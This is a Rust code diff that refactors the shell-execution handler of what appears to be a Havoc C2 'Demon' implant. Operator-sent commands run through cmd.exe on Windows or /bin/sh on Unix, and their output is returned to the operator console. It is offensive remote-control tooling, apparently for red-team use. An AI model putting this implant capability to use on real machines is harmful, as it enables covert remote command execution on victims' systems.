@@ -449,11 +449,83 @@ fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
         "ProcCreate: executing shell command"
     );
 
-    // Translate Windows cmd.exe invocation to a POSIX shell command.
-    let shell_cmd = translate_to_shell_cmd(&process_path, &process_args_raw);
-    info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");
+    let (success, pid, output_bytes) = spawn_shell_command(&process_path, &process_args_raw);
 
-    let (success, pid, output_bytes) = match SysCommand::new("/bin/sh")
+    // Response 1: COMMAND_PROC with process metadata
+    // BE format: [subcmd][path bytes][pid][success][piped][verbose]
+    let mut proc_payload = Vec::new();
+    write_u32_be(&mut proc_payload, subcmd_raw);
+    write_utf16le_be(&mut proc_payload, &process_path);
+    write_u32_be(&mut proc_payload, pid);
+    write_u32_be(&mut proc_payload, u32::from(success));
+    write_u32_be(&mut proc_payload, piped);
+    write_u32_be(&mut proc_payload, verbose);
+
+    // Response 2: COMMAND_OUTPUT with captured output
+    // BE format: [output bytes (UTF-8, length-prefixed)]
+    let mut out_payload = Vec::new();
+    write_bytes_be(&mut out_payload, &output_bytes);
+
+    DispatchResult::MultiRespond(vec![
+        Response::new(DemonCommand::CommandProc, proc_payload),
+        Response::new(DemonCommand::CommandOutput, out_payload),
+    ])
+}
+
+/// Execute a shell command via the platform-native shell and return
+/// `(success, child_pid, captured_output)`.
+///
+/// On **Windows** the command is dispatched through `cmd.exe /c <shell_cmd>`,
+/// matching the wire format sent by the Havoc operator console.
+///
+/// On **Unix** (Linux / macOS — used in CI and cross-compile test builds) the
+/// command is translated from the Windows `cmd.exe /c` style and run via
+/// `/bin/sh -c`.
+#[cfg(windows)]
+fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
+    // Extract the bare shell command from the `/c <cmd>` style the Havoc client sends.
+    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
+    info!(shell_cmd = %shell_cmd, "running via cmd.exe /c");
+    match SysCommand::new("cmd.exe")
+        .arg("/c")
+        .arg(&shell_cmd)
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+    {
+        Ok(child) => {
+            let child_pid = child.id();
+            let output_bytes = match child.wait_with_output() {
+                Ok(o) => {
+                    let mut combined = o.stdout;
+                    if !o.stderr.is_empty() {
+                        if !combined.is_empty() {
+                            combined.push(b'\n');
+                        }
+                        combined.extend_from_slice(&o.stderr);
+                    }
+                    combined
+                }
+                Err(e) => {
+                    warn!("ProcCreate: wait_with_output failed: {e}");
+                    format!("error: {e}").into_bytes()
+                }
+            };
+            (true, child_pid, output_bytes)
+        }
+        Err(e) => {
+            warn!("ProcCreate: cmd.exe spawn failed: {e}");
+            (false, 0u32, format!("error: {e}").into_bytes())
+        }
+    }
+}
+
+#[cfg(not(windows))]
+fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
+    // Translate Windows cmd.exe /c <cmd> style to a POSIX shell command.
+    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
+    info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");
+    match SysCommand::new("/bin/sh")
         .arg("-c")
         .arg(&shell_cmd)
         .stdout(Stdio::piped())
@@ -461,7 +533,6 @@ fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
         .spawn()
     {
         Ok(child) => {
-            // Capture the child's real PID before blocking on exit.
             let child_pid = child.id();
             let output_bytes = match child.wait_with_output() {
                 Ok(o) => {
@@ -485,27 +556,7 @@ fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
             warn!("ProcCreate: /bin/sh spawn failed: {e}");
             (false, 0u32, format!("error: {e}").into_bytes())
         }
-    };
-
-    // Response 1: COMMAND_PROC with process metadata
-    // BE format: [subcmd][path bytes][pid][success][piped][verbose]
-    let mut proc_payload = Vec::new();
-    write_u32_be(&mut proc_payload, subcmd_raw);
-    write_utf16le_be(&mut proc_payload, &process_path);
-    write_u32_be(&mut proc_payload, pid);
-    write_u32_be(&mut proc_payload, u32::from(success));
-    write_u32_be(&mut proc_payload, piped);
-    write_u32_be(&mut proc_payload, verbose);
-
-    // Response 2: COMMAND_OUTPUT with captured output
-    // BE format: [output bytes (UTF-8, length-prefixed)]
-    let mut out_payload = Vec::new();
-    write_bytes_be(&mut out_payload, &output_bytes);
-
-    DispatchResult::MultiRespond(vec![
-        Response::new(DemonCommand::CommandProc, proc_payload),
-        Response::new(DemonCommand::CommandOutput, out_payload),
-    ])
+    }
 }
 
 /// Convert a Windows-style process invocation to a POSIX shell command string.
